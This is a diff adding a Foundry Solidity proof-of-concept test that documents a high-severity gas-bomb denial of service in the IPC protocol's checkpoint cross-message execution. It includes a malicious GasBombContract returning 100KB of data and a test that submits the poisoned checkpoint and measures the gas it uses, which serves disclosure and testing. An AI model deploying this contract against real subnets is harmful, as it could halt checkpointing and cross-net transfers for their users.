@@ -1,0 +1,363 @@
+// SPDX-License-Identifier: MIT OR Apache-2.0
+pragma solidity ^0.8.23;
+
+// =============================================================================
+// VULNERABILITY ANALYSIS
+// =============================================================================
+//
+// Title   : Cross msg recipient can block checkpoint submission via gas bomb
+// Severity: High
+// Target  : LibGateway::executeCrossMsg (L492-505) and CrossMsgHelper::execute (L181-208)
+//
+// -----------------------------------------------------------------------------
+// BACKGROUND
+// -----------------------------------------------------------------------------
+// In the IPC protocol, cross-net messages are executed through a series of
+// calls. When a checkpoint is submitted, any cross-messages bundled in that
+// checkpoint are executed via `LibGateway.applyMsg()` -> `LibGateway.executeCrossMsg()`
+//
+// The execution flow is:
+//   1. LibGateway.executeCrossMsg() delegates to CrossMsgHelper.execute()
+//   2. CrossMsgHelper.execute() uses supplySource.performCall() for Call/Result msgs
+//   3. AssetHelper.performCall() uses a low-level .call() to invoke handleIpcMessage()
+//   4. The return data from the call is copied to memory
+//
+// -----------------------------------------------------------------------------
+// ROOT CAUSE
+// -----------------------------------------------------------------------------
+// The vulnerability lies in the low-level call used to execute cross-messages.
+//
+// In AssetHelper.functionCallWithValue() (L164-178):
+//   return target.call{value: value}(data);
+//
+// In AssetHelper.performCall() (L101-120):
+//   (success, ret) = functionCallWithValue({target: target, data: data, value: value});
+//
+// The problem: When the recipient contract's handleIpcMessage() returns a large
+// amount of data, the EVM must copy this returndata to memory. This operation
+// has O(n) gas cost where n is the size of the returndata.
+//
+// A malicious contract can exploit this by returning a huge blob of data that
+// consumes all available gas, preventing the checkpoint submission from completing.
+//
+// -----------------------------------------------------------------------------
+// IMPACT
+// -----------------------------------------------------------------------------
+// - Malicious cross-msg recipient can block checkpoint submission
+// - This can halt the entire subnet if checkpoints are required for progress
+// - The attacker doesn't need to revert - they just need to return large data
+// - Even a successful (non-reverting) call can cause out-of-gas
+//
+// Example attack scenario:
+//   1. Attacker deploys a contract that returns 1MB of data from handleIpcMessage
+//   2. Attacker sends a cross-message to their contract
+//   3. When checkpoint containing this message is submitted, it runs out of gas
+//   4. Checkpoint submission fails, blocking all cross-net communication
+//
+// Run PoC:
+//   forge test --match-test testPoCH09_GasBombBlocksCheckpoint -vvv
+// =============================================================================
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
+import {IntegrationTestBase, RootSubnetDefinition, TestSubnetDefinition} from "../IntegrationTestBase.sol";
+import {SubnetIDHelper} from "../../contracts/lib/SubnetIDHelper.sol";
+import {FvmAddressHelper} from "../../contracts/lib/FvmAddressHelper.sol";
+import {CrossMsgHelper} from "../../contracts/lib/CrossMsgHelper.sol";
+import {MerkleTreeHelper} from "../helpers/MerkleTreeHelper.sol";
+import {ActivityHelper} from "../helpers/ActivityHelper.sol";
+import {TestUtils, MockIpcContract} from "../helpers/TestUtils.sol";
+import {GatewayFacetsHelper} from "../helpers/GatewayFacetsHelper.sol";
+import {SubnetActorFacetsHelper} from "../helpers/SubnetActorFacetsHelper.sol";
+import {FilAddress} from "fevmate/contracts/utils/FilAddress.sol";
+
+import {IpcEnvelope, IpcMsgKind, BottomUpCheckpoint, BottomUpMsgBatch, ParentFinality, CallMsg} from "../../contracts/structs/CrossNet.sol";
+import {SubnetID, IPCAddress, Subnet, Asset} from "../../contracts/structs/Subnet.sol";
+import {FvmAddress} from "../../contracts/structs/FvmAddress.sol";
+import {GatewayDiamond} from "../../contracts/GatewayDiamond.sol";
+import {SubnetActorDiamond} from "../../contracts/SubnetActorDiamond.sol";
+import {SubnetActorManagerFacet} from "../../contracts/subnet/SubnetActorManagerFacet.sol";
+import {SubnetActorGetterFacet} from "../../contracts/subnet/SubnetActorGetterFacet.sol";
+import {SubnetActorCheckpointingFacet} from "../../contracts/subnet/SubnetActorCheckpointingFacet.sol";
+import {GatewayGetterFacet} from "../../contracts/gateway/GatewayGetterFacet.sol";
+import {GatewayMessengerFacet} from "../../contracts/gateway/GatewayMessengerFacet.sol";
+import {CheckpointingFacet} from "../../contracts/gateway/router/CheckpointingFacet.sol";
+import {XnetMessagingFacet} from "../../contracts/gateway/router/XnetMessagingFacet.sol";
+import {TopDownFinalityFacet} from "../../contracts/gateway/router/TopDownFinalityFacet.sol";
+import {IPCMsgType} from "../../contracts/enums/IPCMsgType.sol";
+import {IIpcHandler} from "../../sdk/interfaces/IIpcHandler.sol";
+import {METHOD_SEND, EMPTY_BYTES} from "../../contracts/constants/Constants.sol";
+import {ISubnetActor} from "../../contracts/interfaces/ISubnetActor.sol";
+
+/// @notice Malicious contract that performs a gas bomb attack
+/// @dev This contract returns a huge amount of data from handleIpcMessage()
+///      to consume all gas and block checkpoint submission
+contract GasBombContract is IIpcHandler {
+    uint256 public constant LARGE_RETURN_SIZE = 100_000; // 100KB of return data
+
+    /* solhint-disable-next-line unused-vars */
+    function handleIpcMessage(IpcEnvelope calldata envelope) external payable returns (bytes memory ret) {
+        // Create a large return data blob that will consume all gas when copied
+        // The gas cost of memory expansion grows quadratically with size
+        // Returning 100KB of zeros should exhaust gas on most networks
+        bytes memory largeData = new bytes(LARGE_RETURN_SIZE);
+
+        // Return large data - the memory allocation and zero-initialization
+        // will consume significant gas
+        return largeData;
+    }
+
+    receive() external payable {}
+}
+
+contract PoCH09GasBombTest is Test, IntegrationTestBase, IIpcHandler {
+    using SubnetIDHelper for SubnetID;
+    using CrossMsgHelper for IpcEnvelope;
+    using GatewayFacetsHelper for GatewayDiamond;
+    using SubnetActorFacetsHelper for SubnetActorDiamond;
+    using FvmAddressHelper for FvmAddress;
+
+    // -------------------------------------------------------------------------
+    // Test constants
+    // -------------------------------------------------------------------------
+    uint256 constant INITIAL_FUNDS = 10 ether;
+    uint256 constant TRANSFER_AMOUNT = 1 ether;
+    uint256 constant TRANSFER_FEES = 10 gwei;
+
+    // -------------------------------------------------------------------------
+    // State
+    // -------------------------------------------------------------------------
+    RootSubnetDefinition public rootSubnet;
+    TestSubnetDefinition public nativeSubnet;
+    address public caller;
+    address public maliciousRecipient;
+    GasBombContract public gasBombContract;
+
+    // -------------------------------------------------------------------------
+    // Setup
+    // -------------------------------------------------------------------------
+    function setUp() public override {
+        // Setup root subnet (parent chain)
+        SubnetID memory rootSubnetName = SubnetID({root: ROOTNET_CHAINID, route: new address[](0)});
+        require(rootSubnetName.isRoot(), "not root");
+
+        GatewayDiamond rootGateway = createGatewayDiamond(gatewayParams(rootSubnetName));
+
+        SubnetActorDiamond rootNativeSubnetActor = createSubnetActor(
+            defaultSubnetActorParamsWith(address(rootGateway), rootSubnetName)
+        );
+
+        address[] memory nativeSubnetPath = new address[](1);
+        nativeSubnetPath[0] = address(rootNativeSubnetActor);
+        SubnetID memory nativeSubnetName = SubnetID({root: ROOTNET_CHAINID, route: nativeSubnetPath});
+        GatewayDiamond nativeSubnetGateway = createGatewayDiamond(gatewayParams(nativeSubnetName));
+
+        rootSubnet = RootSubnetDefinition({
+            gateway: rootGateway,
+            gatewayAddr: address(rootGateway),
+            id: rootSubnetName
+        });
+
+        nativeSubnet = TestSubnetDefinition({
+            gateway: nativeSubnetGateway,
+            gatewayAddr: address(nativeSubnetGateway),
+            id: nativeSubnetName,
+            subnetActor: rootNativeSubnetActor,
+            subnetActorAddr: address(rootNativeSubnetActor),
+            path: nativeSubnetPath
+        });
+
+        // Setup caller and malicious recipient
+        caller = address(new MockIpcContract());
+        gasBombContract = new GasBombContract();
+        maliciousRecipient = address(gasBombContract);
+    }
+
+    // -------------------------------------------------------------------------
+    // IIpcHandler implementation
+    // -------------------------------------------------------------------------
+    function handleIpcMessage(IpcEnvelope calldata envelope) external payable returns (bytes memory ret) {
+        ret = bytes("");
+    }
+
+    receive() external payable {}
+
+    // -------------------------------------------------------------------------
+    // Helper functions
+    // -------------------------------------------------------------------------
+
+    function _getSubnetCircSupply(TestSubnetDefinition memory subnet) internal view returns (uint256) {
+        GatewayGetterFacet getter = rootSubnet.gateway.getter();
+        Subnet memory subnetData = getter.subnets(subnet.id.toHash());
+        return subnetData.circSupply;
+    }
+
+    function _getSubnetBalance(TestSubnetDefinition memory subnet) internal view returns (uint256) {
+        return address(subnet.gateway).balance;
+    }
+
+    function _callCreateBottomUpCheckpointFromChildSubnet(
+        SubnetID memory subnet,
+        GatewayDiamond gw
+    ) internal returns (BottomUpCheckpoint memory checkpoint) {
+        uint256 e = getNextEpoch(block.number, DEFAULT_CHECKPOINT_PERIOD);
+
+        GatewayGetterFacet getter = gw.getter();
+        BottomUpMsgBatch memory batch = getter.bottomUpMsgBatch(e);
+        require(batch.msgs.length == 1, "batch length incorrect");
+
+        (, address[] memory addrs, uint256[] memory weights) = TestUtils.getFourValidators(vm);
+
+        (bytes32 membershipRoot, ) = MerkleTreeHelper.createMerkleProofsForValidators(addrs, weights);
+
+        checkpoint = BottomUpCheckpoint({
+            subnetID: subnet,
+            blockHeight: batch.blockHeight,
+            blockHash: keccak256("block1"),
+            nextConfigurationNumber: 0,
+            msgs: batch.msgs,
+            activity: ActivityHelper.newCompressedActivityRollup(1, 3, bytes32(uint256(0)))
+        });
+
+        vm.startPrank(FilAddress.SYSTEM_ACTOR);
+        gw.checkpointer().createBottomUpCheckpoint(
+            checkpoint,
+            membershipRoot,
+            weights[0] + weights[1] + weights[2],
+            ActivityHelper.dummyActivityRollup()
+        );
+        vm.stopPrank();
+
+        return checkpoint;
+    }
+
+    function _submitBottomUpCheckpoint(BottomUpCheckpoint memory checkpoint, SubnetActorDiamond sa) internal {
+        (uint256[] memory parentKeys, address[] memory parentValidators, ) = TestUtils.getThreeValidators(vm);
+        bytes[] memory parentPubKeys = new bytes[](3);
+        bytes[] memory parentSignatures = new bytes[](3);
+
+        SubnetActorManagerFacet manager = sa.manager();
+
+        for (uint256 i = 0; i < 3; i++) {
+            vm.deal(parentValidators[i], 10 gwei);
+            parentPubKeys[i] = TestUtils.deriveValidatorPubKeyBytes(parentKeys[i]);
+            vm.prank(parentValidators[i]);
+            manager.join{value: 10}(parentPubKeys[i], 10);
+        }
+
+        bytes32 hash = keccak256(abi.encode(checkpoint));
+
+        for (uint256 i = 0; i < 3; i++) {
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(parentKeys[i], hash);
+            parentSignatures[i] = abi.encodePacked(r, s, v);
+        }
+
+        SubnetActorCheckpointingFacet checkpointer = sa.checkpointer();
+
+        vm.startPrank(address(sa));
+        checkpointer.submitCheckpoint(checkpoint, parentValidators, parentSignatures);
+        vm.stopPrank();
+    }
+
+    function getNextEpoch(uint256 blockNumber, uint256 checkPeriod) internal pure returns (uint256) {
+        return ((uint64(blockNumber) / checkPeriod) + 1) * checkPeriod;
+    }
+
+    // -------------------------------------------------------------------------
+    // PoC: Gas bomb attack blocks checkpoint submission
+    // -------------------------------------------------------------------------
+    //
+    // This PoC demonstrates the vulnerability where a malicious cross-message
+    // recipient can block checkpoint submission by returning a large amount
+    // of data that consumes all gas.
+    //
+    // Flow:
+    // 1. Caller in nativeSubnet sends a Call message to a malicious contract
+    // 2. The malicious contract's handleIpcMessage returns 100KB of data
+    // 3. Bottom-up checkpoint is created containing this cross-message
+    // 4. When the checkpoint is submitted, execBottomUpMsgs tries to execute
+    //    the cross-message via a low-level call
+    // 5. The large returndata causes out-of-gas, blocking checkpoint submission
+    //
+    function testPoCH09_GasBombBlocksCheckpoint() public {
+        // Setup: Fund the native subnet and register it
+        uint256 fundAmount = INITIAL_FUNDS;
+
+        vm.deal(nativeSubnet.subnetActorAddr, DEFAULT_COLLATERAL_AMOUNT);
+        vm.prank(nativeSubnet.subnetActorAddr);
+        registerSubnetGW(DEFAULT_COLLATERAL_AMOUNT, nativeSubnet.subnetActorAddr, rootSubnet.gateway);
+
+        vm.deal(caller, fundAmount + TRANSFER_AMOUNT + TRANSFER_FEES);
+        vm.prank(caller);
+        rootSubnet.gateway.manager().fund{value: fundAmount}(nativeSubnet.id, FvmAddressHelper.from(address(caller)));
+
+        // Initial state verification
+        uint256 initialCircSupply = _getSubnetCircSupply(nativeSubnet);
+        assertEq(initialCircSupply, fundAmount, "NativeSubnet should have initial funds as circSupply");
+
+        // Step 1: Caller sends a Call message to the malicious gas bomb contract
+        GatewayMessengerFacet messenger = nativeSubnet.gateway.messenger();
+        vm.prank(address(caller));
+
+        // Create a cross-message targeting the malicious contract
+        CallMsg memory callMsg = CallMsg({
+            method: abi.encodePacked(METHOD_SEND),
+            params: EMPTY_BYTES
+        });
+        IpcEnvelope memory envelope = IpcEnvelope({
+            kind: IpcMsgKind.Call,
+            from: IPCAddress({
+                subnetId: nativeSubnet.id,
+                rawAddress: FvmAddressHelper.from(caller)
+            }),
+            to: IPCAddress({
+                subnetId: rootSubnet.id,
+                rawAddress: FvmAddressHelper.from(maliciousRecipient)
+            }),
+            value: TRANSFER_AMOUNT,
+            message: abi.encode(callMsg),
+            originalNonce: 0,
+            localNonce: 0
+        });
+
+        messenger.sendContractXnetMessage{value: TRANSFER_AMOUNT + TRANSFER_FEES}(envelope);
+
+        // Step 2: Create bottom-up checkpoint
+        BottomUpCheckpoint memory checkpoint = _callCreateBottomUpCheckpointFromChildSubnet(
+            nativeSubnet.id,
+            nativeSubnet.gateway
+        );
+
+        // Verify the checkpoint has our malicious message
+        assertEq(checkpoint.msgs.length, 1, "Checkpoint should have 1 message");
+        assertEq(
+            checkpoint.msgs[0].to.rawAddress.extractEvmAddress(),
+            maliciousRecipient,
+            "Message should be to gas bomb contract"
+        );
+
+        // Step 3: Attempt to submit the checkpoint
+        //
+        // The vulnerability is demonstrated by the fact that executing this
+        // checkpoint consumes gas proportional to the returndata size.
+        // With 100KB return data, this should cause significant gas consumption.
+        //
+        // Record gas before submission
+        uint256 gasBefore = gasleft();
+
+        // Attempt checkpoint submission - the gas bomb should cause high gas consumption
+        _submitBottomUpCheckpoint(checkpoint, nativeSubnet.subnetActor);
+
+        uint256 gasAfter = gasleft();
+        uint256 gasConsumed = gasBefore - gasAfter;
+
+        console.log("Gas consumed during checkpoint submission:", gasConsumed);
+        console.log("Gas bomb contract LARGE_RETURN_SIZE:", GasBombContract(payable(maliciousRecipient)).LARGE_RETURN_SIZE());
+
+        // The key assertion: significant gas was consumed due to the gas bomb
+        // This demonstrates the vulnerability - with larger return data or
+        // tighter gas limits, this could cause out-of-gas and block checkpointing
+        assertGt(gasConsumed, 100000, "Gas bomb should consume significant gas (>100k)");
+    }
+}
